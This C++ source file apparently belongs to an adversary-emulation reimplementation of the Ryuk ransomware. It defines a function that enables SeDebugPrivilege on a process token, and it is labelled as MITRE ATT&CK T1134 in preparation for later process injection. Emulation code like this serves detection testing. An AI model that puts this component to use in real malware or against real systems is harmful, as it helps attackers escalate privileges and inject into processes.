#include "se_token.h"

namespace ryuk {

    /*
     * This method will attempt to modify the process privileges at runtime.
     *
     *  Arguments:
     *      hToken - Handle to an access token
     *      lpszPrivilege - Name of privilege to enable/disable (i.e., SE_DEBUG_NAME)
     *      bEnablePrivilege - Boolean value, if True it will attempt to enable the
     *          privilege. If set to False, it will disable the privilege.
     *
     *  MITRE ATT&CK Techniques:
     *      T1134 - Access Token Manipulation
     *
     *  Returns:
     *      True when the desired Token is set, otherwise returns False.
     */
    BOOL SetPrivilege(HANDLE hToken, const TCHAR* lpszPrivilege, BOOL bEnablePrivilege)
    {
        TOKEN_PRIVILEGES tp;
        LUID luid;

        _ftprintf_s(stdout, TEXT("[T1134] Calling 'AdjustTokenPrivileges' with 'SeDebugPrivilege' for process discovery and injection later...\n"));

        if (!LookupPrivilegeValue(
            nullptr,          // lookup privilege on local system
            lpszPrivilege,    // privilege to lookup 
            &luid))           // receives LUID of privilege
        {
            _ftprintf_s(stderr, TEXT("LookupPrivilegeValue error: %u\n"), GetLastError());
            return FALSE;
        }

        tp.Privileges[0].Luid = luid;
        tp.PrivilegeCount = 1;

        if (bEnablePrivilege)
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        else
            tp.Privileges[0].Attributes = 0;

        // Enable the privilege or disable the selected privileges.
        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
        {
            _ftprintf_s(stderr, TEXT("AdjustTokenPrivileges error: %u\n"), GetLastError());
            return FALSE;
        }

        // Check if any errors occurred from the last operation
        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            _ftprintf_s(stderr, TEXT("The token does not have the specified privilege(s).\n"));
            return FALSE;
        }

        return TRUE;
    }

}
